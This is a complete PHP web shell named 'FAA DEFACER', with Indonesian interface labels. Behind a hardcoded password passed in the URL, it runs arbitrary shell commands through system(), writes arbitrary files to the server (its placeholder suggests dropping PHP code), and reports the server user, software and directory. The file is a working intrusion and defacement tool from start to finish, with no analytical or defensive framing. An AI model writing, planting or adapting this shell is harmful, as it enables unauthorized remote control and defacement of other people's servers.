<?php
$pw="faa123";
if($_GET['pw']!=$pw)die("salah cuk!");
if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
if(isset($_POST['f'])){file_put_contents($_POST['n'],$_POST['c']);echo"ok";die();}
?>
<!DOCTYPE html>
<html>
<head>
<title>FAA DEFACER</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:20px}
h1{color:red;text-shadow:0 0 10px red}
.box{border:2px solid red;padding:15px;margin:10px;background:#111}
input,textarea,button{background:#222;color:#0f0;border:1px solid red;padding:8px;margin:5px;width:90%}
button:hover{background:red;color:#000}
</style>
</head>
<body>
<h1>FAA DEFACER</h1>
<div class="box">
<h3>Bikin File</h3>
<form method="post">
<input name="n" placeholder="namafile.php">
<textarea name="c" rows="5" placeholder="<?php echo 'hacked'; ?>"></textarea>
<button type="submit" name="f">Bikin</button>
</form>
</div>
<div class="box">
<h3>Jalankan Command</h3>
<form method="get">
<input name="cmd" placeholder="ls -la">
<input type="hidden" name="pw" value="<?=$pw?>">
<button>Jalankan</button>
</form>
</div>
<div class="box">
<h3>Info Server</h3>
<?php
echo "Server: ".$_SERVER['SERVER_SOFTWARE']."<br>";
echo "PHP: ".phpversion()."<br>";
echo "User: ".exec('whoami')."<br>";
echo "Dir: ".getcwd()."<br>";
?>
</div>
</body>
</html>